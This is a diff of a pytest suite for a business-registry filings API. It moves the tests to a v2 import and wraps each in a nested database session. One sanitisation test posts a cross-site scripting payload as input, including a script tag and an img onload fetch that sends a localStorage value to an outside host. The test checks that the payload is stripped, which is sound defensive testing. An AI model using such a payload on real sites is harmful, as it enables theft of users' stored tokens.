@@ -46,12 +46,13 @@ from registry_schemas.example_data import (
 )
 
 from legal_api.models import Filing, LegalEntity, RegistrationBootstrap, UserRoles
-from legal_api.resources.v1.business.business_filings import ListFilingResource
+from legal_api.resources.v2.business.business_filings import ListFilingResource
 from legal_api.services.authz import BASIC_USER, STAFF_ROLE
 from legal_api.services.bootstrap import RegistrationBootstrapService
 from legal_api.services.minio import MinioService
 from legal_api.utils.legislation_datetime import LegislationDatetime
 from tests import api_v2, integration_payment
+from tests.unit import nested_session
 from tests.unit.models import (  # noqa:E501,I001
     factory_legal_entity,
     factory_legal_entity_mailing_address,
@@ -66,717 +67,749 @@ from tests.unit.services.utils import create_header
 
 def test_get_temp_business_filing(session, client, jwt):
     """Assert that the business info cannot be received in a valid JSONSchema format."""
-    #
-    # setup
-    identifier = 'Tb31yQIuBw'
-    filing_name = 'incorporationApplication'
-    temp_reg = RegistrationBootstrap()
-    temp_reg._identifier = identifier
-    temp_reg.save()
-    json_data = copy.deepcopy(FILING_HEADER)
-    json_data['filing']['header']['name'] = filing_name
-    json_data['filing'][filing_name] = copy.deepcopy(INCORPORATION)
-    filings = factory_pending_filing(None, json_data)
-    filings.temp_reg = identifier
-    filings.save()
+    with nested_session(session):
+        #
+        # setup
+        identifier = 'Tb31yQIuBw'
+        filing_name = 'incorporationApplication'
+        temp_reg = RegistrationBootstrap()
+        temp_reg._identifier = identifier
+        temp_reg.save()
+        json_data = copy.deepcopy(FILING_HEADER)
+        json_data['filing']['header']['name'] = filing_name
+        json_data['filing'][filing_name] = copy.deepcopy(INCORPORATION)
+        filings = factory_pending_filing(None, json_data)
+        filings.temp_reg = identifier
+        filings.save()
 
-    #
-    # test
-    rv = client.get(f'/api/v2/businesses/{identifier}/filings',
-                    headers=create_header(jwt, [STAFF_ROLE], identifier))
+        #
+        # test
+        rv = client.get(f'/api/v2/businesses/{identifier}/filings',
+                        headers=create_header(jwt, [STAFF_ROLE], identifier))
 
-    #
-    # validate
-    assert rv.status_code == HTTPStatus.OK
-    assert rv.json['filing']['header']['name'] == filing_name
-    assert rv.json['filing'][filing_name] == INCORPORATION
+        #
+        # validate
+        assert rv.status_code == HTTPStatus.OK
+        assert rv.json['filing']['header']['name'] == filing_name
+        assert rv.json['filing'][filing_name] == INCORPORATION
 
 
 def test_get_one_business_filing_by_id(session, client, jwt):
     """Assert that the business info cannot be received in a valid JSONSchema format."""
-    identifier = 'CP7654321'
-    b = factory_legal_entity(identifier)
-    filings = factory_filing(b, ANNUAL_REPORT)
+    with nested_session(session):
+        identifier = 'CP7654321'
+        b = factory_legal_entity(identifier)
+        filings = factory_filing(b, ANNUAL_REPORT)
 
-    rv = client.get(f'/api/v2/businesses/{identifier}/filings/{filings.id}',
-                    headers=create_header(jwt, [STAFF_ROLE], identifier))
+        rv = client.get(f'/api/v2/businesses/{identifier}/filings/{filings.id}',
+                        headers=create_header(jwt, [STAFF_ROLE], identifier))
 
-    assert rv.status_code == HTTPStatus.OK
-    assert rv.json['filing']['annualReport'] == ANNUAL_REPORT['filing']['annualReport']
-    assert rv.json['filing']['business'] == ANNUAL_REPORT['filing']['business']
+        assert rv.status_code == HTTPStatus.OK
+        assert rv.json['filing']['annualReport'] == ANNUAL_REPORT['filing']['annualReport']
+        assert rv.json['filing']['business'] == ANNUAL_REPORT['filing']['business']
 
 
 def test_get_one_business_filing_by_id_raw_json(session, client, jwt):
     """Assert that the raw json originally submitted is returned."""
-    identifier = 'CP7654321'
-    b = factory_legal_entity(identifier)
-    filings = factory_filing(b, ANNUAL_REPORT)
+    with nested_session(session):
+        identifier = 'CP7654321'
+        b = factory_legal_entity(identifier)
+        filings = factory_filing(b, ANNUAL_REPORT)
 
-    rv = client.get(f'/api/v2/businesses/{identifier}/filings/{filings.id}?original=true',
-                    headers=create_header(jwt, [STAFF_ROLE], identifier))
+        rv = client.get(f'/api/v2/businesses/{identifier}/filings/{filings.id}?original=true',
+                        headers=create_header(jwt, [STAFF_ROLE], identifier))
 
-    assert rv.status_code == HTTPStatus.OK
-    assert rv.json['filing']['annualReport'] == ANNUAL_REPORT['filing']['annualReport']
-    assert rv.json['filing']['business'] == ANNUAL_REPORT['filing']['business']
+        assert rv.status_code == HTTPStatus.OK
+        assert rv.json['filing']['annualReport'] == ANNUAL_REPORT['filing']['annualReport']
+        assert rv.json['filing']['business'] == ANNUAL_REPORT['filing']['business']
 
 
 def test_get_404_when_business_invalid_filing_id(session, client, jwt):
     """Assert that the business info cannot be received in a valid JSONSchema format."""
-    identifier = 'CP7654321'
-    b = factory_legal_entity(identifier)
-    filings = factory_filing(b, ANNUAL_REPORT)
+    with nested_session(session):
+        identifier = 'CP7654321'
+        b = factory_legal_entity(identifier)
+        filings = factory_filing(b, ANNUAL_REPORT)
 
-    print('test_get_one_business_filing - filing:', filings)
+        print('test_get_one_business_filing - filing:', filings)
 
-    print(f'/api/v2/businesses/{identifier}/filings/{filings.id}')
+        print(f'/api/v2/businesses/{identifier}/filings/{filings.id}')
 
-    rv = client.get(f'/api/v2/businesses/{identifier}/filings/{filings.id + 1}',
-                    headers=create_header(jwt, [STAFF_ROLE], identifier))
+        rv = client.get(f'/api/v2/businesses/{identifier}/filings/{filings.id + 1}',
+                        headers=create_header(jwt, [STAFF_ROLE], identifier))
 
-    assert rv.status_code == HTTPStatus.NOT_FOUND
-    assert rv.json == {'message': f'{identifier} no filings found'}
+        assert rv.status_code == HTTPStatus.NOT_FOUND
+        assert rv.json == {'message': f'{identifier} no filings found'}
 
 
 def test_get_empty_filings_with_invalid_business(session, client, jwt):
     """Assert that a filing cannot be created against non-existent business."""
-    identifier = 'CP7654321'
-    filings_id = 1
+    with nested_session(session):
+        identifier = 'CP7654321'
+        filings_id = 1
 
-    rv = client.get(f'/api/v2/businesses/{identifier}/filings/{filings_id}',
-                    headers=create_header(jwt, [STAFF_ROLE], identifier))
+        rv = client.get(f'/api/v2/businesses/{identifier}/filings/{filings_id}',
+                        headers=create_header(jwt, [STAFF_ROLE], identifier))
 
-    assert rv.status_code == HTTPStatus.NOT_FOUND
+        assert rv.status_code == HTTPStatus.NOT_FOUND
 
 
 def test_post_fail_if_given_filing_id(session, client, jwt):
     """Assert that a filing cannot be created against a given filing_id."""
-    identifier = 'CP7654321'
-    b = factory_legal_entity(identifier)
-    filings = factory_filing(b, ANNUAL_REPORT)
+    with nested_session(session):
+        identifier = 'CP7654321'
+        b = factory_legal_entity(identifier)
+        filings = factory_filing(b, ANNUAL_REPORT)
 
-    rv = client.post(f'/api/v2/businesses/{identifier}/filings/{filings.id}',
-                     json=ANNUAL_REPORT,
-                     headers=create_header(jwt, [STAFF_ROLE], identifier)
-                     )
+        rv = client.post(f'/api/v2/businesses/{identifier}/filings/{filings.id}',
+                        json=ANNUAL_REPORT,
+                        headers=create_header(jwt, [STAFF_ROLE], identifier)
+                        )
 
-    assert rv.status_code == HTTPStatus.FORBIDDEN
-    assert rv.json['errors'][0] == {'message':
-                                    f'Illegal to attempt to create a duplicate filing for {identifier}.'}
+        assert rv.status_code == HTTPStatus.FORBIDDEN
+        assert rv.json['errors'][0] == {'message':
+                                        f'Illegal to attempt to create a duplicate filing for {identifier}.'}
 
 
 def test_post_filing_no_business(session, client, jwt):
     """Assert that a filing cannot be created against non-existent business."""
-    identifier = 'CP7654321'
+    with nested_session(session):
+        identifier = 'CP7654321'
 
-    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
-                     json=ANNUAL_REPORT,
-                     headers=create_header(jwt, [STAFF_ROLE], identifier)
-                     )
+        rv = client.post(f'/api/v2/businesses/{identifier}/filings',
+                        json=ANNUAL_REPORT,
+                        headers=create_header(jwt, [STAFF_ROLE], identifier)
+                        )
 
-    assert rv.status_code == HTTPStatus.BAD_REQUEST
-    assert rv.json['errors'][0] == {'message': 'A valid business is required.'}
+        assert rv.status_code == HTTPStatus.BAD_REQUEST
+        assert rv.json['errors'][0] == {'message': 'A valid business is required.'}
 
 
 def test_post_empty_annual_report_to_a_business(session, client, jwt):
     """Assert that an empty filing cannot be posted."""
-    identifier = 'CP7654321'
-    factory_legal_entity(identifier)
+    with nested_session(session):
+        identifier = 'CP7654321'
+        factory_legal_entity(identifier)
 
-    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
-                     json=None,
-                     headers=create_header(jwt, [STAFF_ROLE], identifier)
-                     )
+        rv = client.post(f'/api/v2/businesses/{identifier}/filings',
+                        json=None,
+                        headers=create_header(jwt, [STAFF_ROLE], identifier)
+                        )
 
-    assert rv.status_code in (HTTPStatus.BAD_REQUEST, HTTPStatus.UNSUPPORTED_MEDIA_TYPE)
+        assert rv.status_code in (HTTPStatus.BAD_REQUEST, HTTPStatus.UNSUPPORTED_MEDIA_TYPE)
 
-    if rv.status_code == HTTPStatus.UNSUPPORTED_MEDIA_TYPE:
-        assert rv.json == {"detail": "Unsupported media type '' in request. 'application/json' is required."}
+        if rv.status_code == HTTPStatus.UNSUPPORTED_MEDIA_TYPE:
+            assert rv.json == {"detail": "Unsupported media type '' in request. 'application/json' is required."}
 
-    if rv.status_code == HTTPStatus.BAD_REQUEST:
-        assert rv.json['errors'][0] == {'message': f'No filing json data in body of post for {identifier}.'}
+        if rv.status_code == HTTPStatus.BAD_REQUEST:
+            assert rv.json['errors'][0] == {'message': f'No filing json data in body of post for {identifier}.'}
 
 
 def test_post_authorized_draft_ar(session, client, jwt):
     """Assert that a unpaid filing can be posted."""
-    identifier = 'CP7654321'
-    factory_legal_entity(identifier)
+    with nested_session(session):
+        identifier = 'CP7654321'
+        factory_legal_entity(identifier)
 
-    rv = client.post(f'/api/v2/businesses/{identifier}/filings?draft=true',
-                     json=ANNUAL_REPORT,
-                     headers=create_header(jwt, [STAFF_ROLE], identifier)
-                     )
+        rv = client.post(f'/api/v2/businesses/{identifier}/filings?draft=true',
+                        json=ANNUAL_REPORT,
+                        headers=create_header(jwt, [STAFF_ROLE], identifier)
+                        )
 
-    assert rv.status_code == HTTPStatus.CREATED
+        assert rv.status_code == HTTPStatus.CREATED
 
 
 def test_post_not_authorized_draft_ar(session, client, jwt):
     """Assert that a unpaid filing can be posted."""
-    identifier = 'CP7654321'
-    factory_legal_entity(identifier)
+    with nested_session(session):
+        identifier = 'CP7654321'
+        factory_legal_entity(identifier)
 
-    rv = client.post(f'/api/v2/businesses/{identifier}/filings?draft=true',
-                     json=ANNUAL_REPORT,
-                     headers=create_header(jwt, [BASIC_USER], 'WRONGUSER')
-                     )
+        rv = client.post(f'/api/v2/businesses/{identifier}/filings?draft=true',
+                        json=ANNUAL_REPORT,
+                        headers=create_header(jwt, [BASIC_USER], 'WRONGUSER')
+                        )
 
-    assert rv.status_code == HTTPStatus.UNAUTHORIZED
+        assert rv.status_code == HTTPStatus.UNAUTHORIZED
 
 
 def test_post_not_allowed_historical(session, client, jwt):
     """Assert that a filing is not allowed for historical business."""
-    identifier = 'CP7654321'
-    factory_legal_entity(identifier, state=LegalEntity.State.HISTORICAL)
+    with nested_session(session):
+        identifier = 'CP7654321'
+        factory_legal_entity(identifier, state=LegalEntity.State.HISTORICAL)
 
-    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
-                     json=ANNUAL_REPORT,
-                     headers=create_header(jwt, [BASIC_USER], 'WRONGUSER')
-                     )
+        rv = client.post(f'/api/v2/businesses/{identifier}/filings',
+                        json=ANNUAL_REPORT,
+                        headers=create_header(jwt, [BASIC_USER], 'WRONGUSER')
+                        )
 
-    assert rv.status_code == HTTPStatus.UNAUTHORIZED
+        assert rv.status_code == HTTPStatus.UNAUTHORIZED
 
 
 def test_post_allowed_historical(session, client, jwt):
     """Assert that a filing is allowed for historical business."""
-    identifier = 'BC7654321'
-    factory_legal_entity(identifier, state=LegalEntity.State.HISTORICAL)
+    with nested_session(session):
+        identifier = 'BC7654321'
+        factory_legal_entity(identifier, state=LegalEntity.State.HISTORICAL)
 
-    rv = client.post(f'/api/v2/businesses/{identifier}/filings?draft=true',
-                     json=COURT_ORDER_FILING_TEMPLATE,
-                     headers=create_header(jwt, [STAFF_ROLE], 'user')
-                     )
+        rv = client.post(f'/api/v2/businesses/{identifier}/filings?draft=true',
+                        json=COURT_ORDER_FILING_TEMPLATE,
+                        headers=create_header(jwt, [STAFF_ROLE], 'user')
+                        )
 
-    assert rv.status_code == HTTPStatus.CREATED
+        assert rv.status_code == HTTPStatus.CREATED
 
 
 def test_special_resolution_sanitation(session, client, jwt):
     """Assert that script tags can't be passed into special resolution resolution field."""
-    identifier = 'BC7654399'
-    factory_legal_entity(identifier, state=LegalEntity.State.ACTIVE)
+    with nested_session(session):
+        identifier = 'BC7654399'
+        factory_legal_entity(identifier, state=LegalEntity.State.ACTIVE)
 
-    data = copy.deepcopy(FILING_HEADER)
-    data['filing']['header']['name'] = 'specialResolution'
-    data['filing']['specialResolution'] = copy.deepcopy(SPECIAL_RESOLUTION)
-    data['filing']['specialResolution']['resolution'] = """
-        <p>Hello this is great</p><script>alert("hello")</script>
-        <img
-            src="https://www.google.ca"
-            style="display:none"
-            onload="fetch('https://www.google.ca', {method: 'POST', body: localStorage.getItem('rfdsfds432432423423')})"
-        >
-        """
-    rv = client.post(f'/api/v2/businesses/{identifier}/filings?draft=true',
-                     json=data,
-                     headers=create_header(jwt, [STAFF_ROLE], 'user')
-                     )
-    assert rv.status_code == HTTPStatus.CREATED
-    assert rv.json['filing']['specialResolution']['resolution'] == ' <p>Hello this is great</p> '
+        data = copy.deepcopy(FILING_HEADER)
+        data['filing']['header']['name'] = 'specialResolution'
+        data['filing']['specialResolution'] = copy.deepcopy(SPECIAL_RESOLUTION)
+        data['filing']['specialResolution']['resolution'] = """
+            <p>Hello this is great</p><script>alert("hello")</script>
+            <img
+                src="https://www.google.ca"
+                style="display:none"
+                onload="fetch('https://www.google.ca', {method: 'POST', body: localStorage.getItem('rfdsfds432432423423')})"
+            >
+            """
+        rv = client.post(f'/api/v2/businesses/{identifier}/filings?draft=true',
+                        json=data,
+                        headers=create_header(jwt, [STAFF_ROLE], 'user')
+                        )
+        assert rv.status_code == HTTPStatus.CREATED
+        assert rv.json['filing']['specialResolution']['resolution'] == ' <p>Hello this is great</p> '
 
 
 def test_post_draft_ar(session, client, jwt):
     """Assert that a unpaid filing can be posted."""
-    identifier = 'CP7654321'
-    factory_legal_entity(identifier)
+    with nested_session(session):
+        identifier = 'CP7654321'
+        factory_legal_entity(identifier)
 
-    rv = client.post(f'/api/v2/businesses/{identifier}/filings?draft=true',
-                     json=ANNUAL_REPORT,
-                     headers=create_header(jwt, [STAFF_ROLE], identifier)
-                     )
+        rv = client.post(f'/api/v2/businesses/{identifier}/filings?draft=true',
+                        json=ANNUAL_REPORT,
+                        headers=create_header(jwt, [STAFF_ROLE], identifier)
+                        )
 
-    assert rv.status_code == HTTPStatus.CREATED
-    assert not rv.json['filing']['header'].get('paymentToken')
-    assert rv.json['filing']['header']['filingId']
+        assert rv.status_code == HTTPStatus.CREATED
+        assert not rv.json['filing']['header'].get('paymentToken')
+        assert rv.json['filing']['header']['filingId']
 
 
 def test_post_only_validate_ar(session, client, jwt):
     """Assert that a unpaid filing can be posted."""
-    identifier = 'CP7654321'
-    factory_legal_entity(identifier,
-                     founding_date=(datetime.utcnow() - datedelta.datedelta(years=2)),
-                     last_ar_date=datetime(datetime.utcnow().year - 1, 4, 20).date())
+    with nested_session(session):
+        identifier = 'CP7654321'
+        factory_legal_entity(identifier,
+                        founding_date=(datetime.utcnow() - datedelta.datedelta(years=2)),
+                        last_ar_date=datetime(datetime.utcnow().year - 1, 4, 20).date())
 
-    ar = copy.deepcopy(ANNUAL_REPORT)
-    annual_report_date = datetime(datetime.utcnow().year, 2, 20).date()
-    if annual_report_date > datetime.utcnow().date():
-        annual_report_date = datetime.utcnow().date()
-    ar['filing']['annualReport']['annualReportDate'] = annual_report_date.isoformat()
-    ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
+        ar = copy.deepcopy(ANNUAL_REPORT)
+        annual_report_date = datetime(datetime.utcnow().year, 2, 20).date()
+        if annual_report_date > datetime.utcnow().date():
+            annual_report_date = datetime.utcnow().date()
+        ar['filing']['annualReport']['annualReportDate'] = annual_report_date.isoformat()
+        ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
 
-    rv = client.post(f'/api/v2/businesses/{identifier}/filings?only_validate=true',
-                     json=ar,
-                     headers=create_header(jwt, [STAFF_ROLE], identifier)
-                     )
+        rv = client.post(f'/api/v2/businesses/{identifier}/filings?only_validate=true',
+                        json=ar,
+                        headers=create_header(jwt, [STAFF_ROLE], identifier)
+                        )
 
-    assert rv.status_code == HTTPStatus.OK
-    assert not rv.json.get('errors')
+        assert rv.status_code == HTTPStatus.OK
+        assert not rv.json.get('errors')
 
 
 def test_post_validate_ar_using_last_ar_date(session, client, jwt):
     """Assert that a unpaid filing can be posted."""
-    identifier = 'CP7654321'
-    factory_legal_entity(identifier,
-                     last_ar_date=datetime(datetime.utcnow().year - 1, 4, 20).date(),
-                     founding_date=(datetime.utcnow() - datedelta.datedelta(years=2))  # founding date = 2 years ago
-                     )
-    ar = copy.deepcopy(ANNUAL_REPORT)
-    annual_report_date = datetime(datetime.utcnow().year, 2, 20).date()
-    if annual_report_date > datetime.utcnow().date():
-        annual_report_date = datetime.utcnow().date()
-    ar['filing']['annualReport']['annualReportDate'] = annual_report_date.isoformat()
-    ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
+    with nested_session(session):
+        identifier = 'CP7654321'
+        factory_legal_entity(identifier,
+                        last_ar_date=datetime(datetime.utcnow().year - 1, 4, 20).date(),
+                        founding_date=(datetime.utcnow() - datedelta.datedelta(years=2))  # founding date = 2 years ago
+                        )
+        ar = copy.deepcopy(ANNUAL_REPORT)
+        annual_report_date = datetime(datetime.utcnow().year, 2, 20).date()
+        if annual_report_date > datetime.utcnow().date():
+            annual_report_date = datetime.utcnow().date()
+        ar['filing']['annualReport']['annualReportDate'] = annual_report_date.isoformat()
+        ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
 
-    rv = client.post(f'/api/v2/businesses/{identifier}/filings?only_validate=true',
-                     json=ar,
-                     headers=create_header(jwt, [STAFF_ROLE], identifier)
-                     )
+        rv = client.post(f'/api/v2/businesses/{identifier}/filings?only_validate=true',
+                        json=ar,
+                        headers=create_header(jwt, [STAFF_ROLE], identifier)
+                        )
 
-    assert rv.status_code == HTTPStatus.OK
-    assert not rv.json.get('errors')
+        assert rv.status_code == HTTPStatus.OK
+        assert not rv.json.get('errors')
 
 
 def test_validate_filing_json_for_filing_type(session, client, jwt):
     """Assert that filing type is in filing json."""
-    import copy
-    identifier = 'CP7654321'
-    factory_legal_entity(identifier)
+    with nested_session(session):
+        import copy
+        identifier = 'CP7654321'
+        factory_legal_entity(identifier)
 
-    ar = copy.deepcopy(ANNUAL_REPORT)
-    ar['filing']['header'].pop('name')
+        ar = copy.deepcopy(ANNUAL_REPORT)
+        ar['filing']['header'].pop('name')
 
-    rv = client.post(f'/api/v2/businesses/{identifier}/filings?only_validate=true',
-                     json=ar,
-                     headers=create_header(jwt, [STAFF_ROLE], identifier)
-                     )
+        rv = client.post(f'/api/v2/businesses/{identifier}/filings?only_validate=true',
+                        json=ar,
+                        headers=create_header(jwt, [STAFF_ROLE], identifier)
+                        )
 
-    assert rv.status_code == HTTPStatus.BAD_REQUEST
-    assert rv.json.get('errors')
-    assert rv.json['errors'][0] == {'message': 'filing/header/name is a required property'}
+        assert rv.status_code == HTTPStatus.BAD_REQUEST
+        assert rv.json.get('errors')
+        assert rv.json['errors'][0] == {'message': 'filing/header/name is a required property'}
 
 
 def test_post_only_validate_ar_invalid_routing_slip(session, client, jwt):
     """Assert that a unpaid filing can be posted."""
-    import copy
-    identifier = 'CP7654321'
-    factory_legal_entity(identifier)
+    with nested_session(session):
+        import copy
+        identifier = 'CP7654321'
+        factory_legal_entity(identifier)
 
-    ar = copy.deepcopy(ANNUAL_REPORT)
-    ar['filing']['header']['routingSlipNumber'] = '1231313329988888'
+        ar = copy.deepcopy(ANNUAL_REPORT)
+        ar['filing']['header']['routingSlipNumber'] = '1231313329988888'
 
-    rv = client.post(f'/api/v2/businesses/{identifier}/filings?only_validate=true',
-                     json=ar,
-                     headers=create_header(jwt, [STAFF_ROLE], identifier)
-                     )
+        rv = client.post(f'/api/v2/businesses/{identifier}/filings?only_validate=true',
+                        json=ar,
+                        headers=create_header(jwt, [STAFF_ROLE], identifier)
+                        )
 
-    assert rv.status_code == HTTPStatus.UNPROCESSABLE_ENTITY
-    assert rv.json.get('errors')
-    assert rv.json['errors'][0]['error'] == "'1231313329988888' is too long"
+        assert rv.status_code == HTTPStatus.UNPROCESSABLE_ENTITY
+        assert rv.json.get('errors')
+        assert rv.json['errors'][0]['error'] == "'1231313329988888' is too long"
 
-    ar['filing']['header']['routingSlipNumber'] = '1'
+        ar['filing']['header']['routingSlipNumber'] = '1'
 
-    rv = client.post(f'/api/v2/businesses/{identifier}/filings?only_validate=true',
-                     json=ar,
-                     headers=create_header(jwt, [STAFF_ROLE], identifier)
-                     )
+        rv = client.post(f'/api/v2/businesses/{identifier}/filings?only_validate=true',
+                        json=ar,
+                        headers=create_header(jwt, [STAFF_ROLE], identifier)
+                        )
 
-    assert rv.status_code == HTTPStatus.UNPROCESSABLE_ENTITY
-    assert rv.json.get('errors')
+        assert rv.status_code == HTTPStatus.UNPROCESSABLE_ENTITY
+        assert rv.json.get('errors')
 
 
 def test_post_validate_ar_valid_routing_slip(session, client, jwt):
     """Assert that a unpaid filing can be posted."""
-    identifier = 'CP7654321'
-    factory_legal_entity(identifier,
-                     founding_date=(datetime.utcnow() - datedelta.datedelta(years=2)),
-                     last_ar_date=datetime(datetime.utcnow().year - 1, 4, 20).date())
+    with nested_session(session):
+        identifier = 'CP7654321'
+        factory_legal_entity(identifier,
+                        founding_date=(datetime.utcnow() - datedelta.datedelta(years=2)),
+                        last_ar_date=datetime(datetime.utcnow().year - 1, 4, 20).date())
 
-    ar = copy.deepcopy(ANNUAL_REPORT)
-    annual_report_date = datetime(datetime.utcnow().year, 2, 20).date()
-    if annual_report_date > datetime.utcnow().date():
-        annual_report_date = datetime.utcnow().date()
-    ar['filing']['annualReport']['annualReportDate'] = annual_report_date.isoformat()
-    ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
-    ar['filing']['header']['routingSlipNumber'] = '123131332'
+        ar = copy.deepcopy(ANNUAL_REPORT)
+        annual_report_date = datetime(datetime.utcnow().year, 2, 20).date()
+        if annual_report_date > datetime.utcnow().date():
+            annual_report_date = datetime.utcnow().date()
+        ar['filing']['annualReport']['annualReportDate'] = annual_report_date.isoformat()
+        ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
+        ar['filing']['header']['routingSlipNumber'] = '123131332'
 
-    rv = client.post(f'/api/v2/businesses/{identifier}/filings?only_validate=true',
-                     json=ar,
-                     headers=create_header(jwt, [STAFF_ROLE], identifier)
-                     )
+        rv = client.post(f'/api/v2/businesses/{identifier}/filings?only_validate=true',
+                        json=ar,
+                        headers=create_header(jwt, [STAFF_ROLE], identifier)
+                        )
 
-    assert rv.status_code == HTTPStatus.OK
-    assert not rv.json.get('errors')
+        assert rv.status_code == HTTPStatus.OK
+        assert not rv.json.get('errors')
 
 
 @integration_payment
 def test_post_valid_ar(session, client, jwt):
     """Assert that a filing can be completed up to payment."""
-    from legal_api.models import Filing
-    identifier = 'CP7654321'
-    legal_entity =factory_legal_entity(identifier,
-                                founding_date=(datetime.utcnow() - datedelta.YEAR)
-                                )
-    factory_legal_entity_mailing_address(legal_entity)
-    ar = copy.deepcopy(ANNUAL_REPORT)
-    ar['filing']['annualReport']['annualReportDate'] = datetime.utcnow().date().isoformat()
-    ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
+    with nested_session(session):
+        from legal_api.models import Filing
+        identifier = 'CP7654321'
+        legal_entity =factory_legal_entity(identifier,
+                                    founding_date=(datetime.utcnow() - datedelta.YEAR)
+                                    )
+        factory_legal_entity_mailing_address(legal_entity)
+        ar = copy.deepcopy(ANNUAL_REPORT)
+        ar['filing']['annualReport']['annualReportDate'] = datetime.utcnow().date().isoformat()
+        ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
 
-    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
-                     json=ar,
-                     headers=create_header(jwt, [STAFF_ROLE], identifier)
-                     )
-    # check return
-    assert rv.status_code == HTTPStatus.CREATED
-    assert not rv.json.get('errors')
-    assert rv.json['filing']['header']['filingId']
-    assert rv.json['filing']['header']['paymentToken']
-    assert rv.json['filing']['header']['paymentToken'] == '1'
+        rv = client.post(f'/api/v2/businesses/{identifier}/filings',
+                        json=ar,
+                        headers=create_header(jwt, [STAFF_ROLE], identifier)
+                        )
+        # check return
+        assert rv.status_code == HTTPStatus.CREATED
+        assert not rv.json.get('errors')
+        assert rv.json['filing']['header']['filingId']
+        assert rv.json['filing']['header']['paymentToken']
+        assert rv.json['filing']['header']['paymentToken'] == '1'
 
-    # check stored filing
-    filing = Filing.get_filing_by_payment_token(rv.json['filing']['header']['paymentToken'])
-    assert filing
-    assert filing.status == Filing.Status.PENDING.value
+        # check stored filing
+        filing = Filing.get_filing_by_payment_token(rv.json['filing']['header']['paymentToken'])
+        assert filing
+        assert filing.status == Filing.Status.PENDING.value
 
 
 @integration_payment
 def test_payment_header(session, client, jwt):
     """Assert that a filing can be completed up to payment."""
-    from legal_api.models import Filing
-    identifier = 'CP7654321'
-    payment_account = '12345'
-    legal_entity =factory_legal_entity(identifier,
-                                founding_date=(datetime.utcnow() - datedelta.YEAR)
-                                )
-    factory_legal_entity_mailing_address(legal_entity)
-    data = copy.deepcopy(FILING_HEADER)
-    data['filing']['header']['name'] = 'specialResolution'
-    data['filing']['specialResolution'] = SPECIAL_RESOLUTION
+    with nested_session(session):
+        from legal_api.models import Filing
+        identifier = 'CP7654321'
+        payment_account = '12345'
+        legal_entity =factory_legal_entity(identifier,
+                                    founding_date=(datetime.utcnow() - datedelta.YEAR)
+                                    )
+        factory_legal_entity_mailing_address(legal_entity)
+        data = copy.deepcopy(FILING_HEADER)
+        data['filing']['header']['name'] = 'specialResolution'
+        data['filing']['specialResolution'] = SPECIAL_RESOLUTION
 
-    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
-                     json=data,
-                     headers=create_header(jwt, [STAFF_ROLE], identifier, **{'accountID': payment_account})
-                     )
-    # check return
-    assert rv.status_code == HTTPStatus.CREATED
-    assert not rv.json.get('errors')
-    assert rv.json['filing']['header']['filingId']
+        rv = client.post(f'/api/v2/businesses/{identifier}/filings',
+                        json=data,
+                        headers=create_header(jwt, [STAFF_ROLE], identifier, **{'accountID': payment_account})
+                        )
+        # check return
+        assert rv.status_code == HTTPStatus.CREATED
+        assert not rv.json.get('errors')
+        assert rv.json['filing']['header']['filingId']
 
-    # check stored filing
-    filing = Filing.find_by_id(rv.json['filing']['header']['filingId'])
-    assert filing
-    assert filing.payment_account == payment_account
+        # check stored filing
+        filing = Filing.find_by_id(rv.json['filing']['header']['filingId'])
+        assert filing
+        assert filing.payment_account == payment_account
 
 
 @integration_payment
 def test_cancel_payment_for_pending_filing(session, client, jwt):
     """Assert that a filing can be completed up to payment."""
-    from legal_api.models import Filing
-    identifier = 'CP7654321'
-    legal_entity =factory_legal_entity(identifier,
-                                founding_date=(datetime.utcnow() - datedelta.YEAR)
-                                )
-    factory_legal_entity_mailing_address(legal_entity)
-    ar = copy.deepcopy(ANNUAL_REPORT)
-    ar['filing']['annualReport']['annualReportDate'] = datetime.utcnow().date().isoformat()
-    ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
+    with nested_session(session):
+        from legal_api.models import Filing
+        identifier = 'CP7654321'
+        legal_entity =factory_legal_entity(identifier,
+                                    founding_date=(datetime.utcnow() - datedelta.YEAR)
+                                    )
+        factory_legal_entity_mailing_address(legal_entity)
+        ar = copy.deepcopy(ANNUAL_REPORT)
+        ar['filing']['annualReport']['annualReportDate'] = datetime.utcnow().date().isoformat()
+        ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
 
-    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
-                     json=ar,
-                     headers=create_header(jwt, [STAFF_ROLE], identifier)
-                     )
+        rv = client.post(f'/api/v2/businesses/{identifier}/filings',
+                        json=ar,
+                        headers=create_header(jwt, [STAFF_ROLE], identifier)
+                        )
 
-    # check return
-    assert rv.status_code == HTTPStatus.CREATED
-    assert not rv.json.get('errors')
-    assert rv.json['filing']['header']['filingId']
-    assert rv.json['filing']['header']['paymentToken']
+        # check return
+        assert rv.status_code == HTTPStatus.CREATED
+        assert not rv.json.get('errors')
+        assert rv.json['filing']['header']['filingId']
+        assert rv.json['filing']['header']['paymentToken']
 
-    # check stored filing
-    filing = Filing.get_filing_by_payment_token(rv.json['filing']['header']['paymentToken'])
-    assert filing
-    assert filing.status == Filing.Status.PENDING.value
+        # check stored filing
+        filing = Filing.get_filing_by_payment_token(rv.json['filing']['header']['paymentToken'])
+        assert filing
+        assert filing.status == Filing.Status.PENDING.value
 
-    filing_id = rv.json['filing']['header']['filingId']
-    rv = client.patch(f'/api/v2/businesses/{identifier}/filings/{filing_id}', json={},
-                      headers=create_header(jwt, [STAFF_ROLE], identifier))
-    assert rv.status_code == HTTPStatus.ACCEPTED
-    assert not rv.json.get('errors')
-    assert rv.json['filing']['header'].get('paymentToken', None) is None
